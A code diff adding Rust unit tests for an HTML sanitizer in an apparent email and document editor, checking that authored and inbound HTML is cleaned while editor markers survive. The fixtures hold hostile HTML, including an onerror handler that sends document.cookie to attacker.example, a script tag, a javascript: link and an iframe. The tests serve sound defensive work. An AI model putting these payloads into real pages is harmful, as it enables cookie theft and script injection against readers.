@@ -103,3 +103,64 @@ fn fragments_are_cleaned_without_body_reconstruction() {
     assert!(sanitized.contains("color:red;"));
     assert!(!sanitized.contains("position"));
 }
+
+#[test]
+fn authored_html_strips_event_handler_payloads() {
+    // The reported vector: a locally-composed body that reaches
+    // `body_html_sanitized` verbatim and executes on every reader's page.
+    let authored = r#"<body><p>hi</p><img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)"></body>"#;
+
+    let sanitized = sanitize_authored_html(authored);
+
+    assert!(sanitized.contains("<p>hi</p>"));
+    assert!(!sanitized.to_ascii_lowercase().contains("onerror"));
+    assert!(!sanitized.contains("attacker.example"));
+}
+
+#[test]
+fn authored_html_strips_scripts_and_dangerous_schemes() {
+    let authored = r#"<div>text</div>
+        <script>steal()</script>
+        <a href="javascript:alert(1)">js</a>
+        <iframe src="https://evil.test"></iframe>
+        <style>.a{position:fixed;color:red}</style>"#;
+
+    let sanitized = sanitize_authored_html(authored);
+
+    assert!(sanitized.contains("<div>text</div>"));
+    for vector in ["<script", "steal()", "javascript:", "<iframe", "position"] {
+        assert!(!sanitized.contains(vector), "{vector} must be removed");
+    }
+    assert!(sanitized.contains("color:red;"));
+}
+
+#[test]
+fn authored_html_keeps_editor_round_trip_markers() {
+    // Reopening a draft rebuilds Lexical nodes from these; dropping them
+    // silently degrades mentions, indentation, and list state.
+    let authored = r#"<p style="padding-inline-start:40px" data-lexical-indent="1">indented</p>
+        <a href="https://app.macro.com/app/doc/1" data-document-mention="true" data-document-id="1" data-document-name="Spec" data-block-name="doc">Spec</a>
+        <div class="macro_quote"><p>quoted</p></div>
+        <ol><li value="3">three</li></ol>"#;
+
+    let sanitized = sanitize_authored_html(authored);
+
+    assert!(sanitized.contains(r#"data-lexical-indent="1""#));
+    assert!(sanitized.contains("padding-inline-start:40px"));
+    assert!(sanitized.contains(r#"data-document-mention="true""#));
+    assert!(sanitized.contains(r#"data-document-id="1""#));
+    assert!(sanitized.contains(r#"class="macro_quote""#));
+    assert!(sanitized.contains(r#"value="3""#));
+}
+
+#[test]
+fn provider_fetched_html_does_not_gain_data_attributes() {
+    // Only the authored path opts into `data-*`; inbound mail must not be able
+    // to forge the editor's round-trip markers.
+    let inbound = r#"<body><a href="https://evil.test" data-document-mention="true" data-document-id="1">x</a></body>"#;
+
+    let sanitized = sanitize_email_html(inbound);
+
+    assert!(!sanitized.contains("data-document-mention"));
+    assert!(!sanitized.contains("data-document-id"));
+}
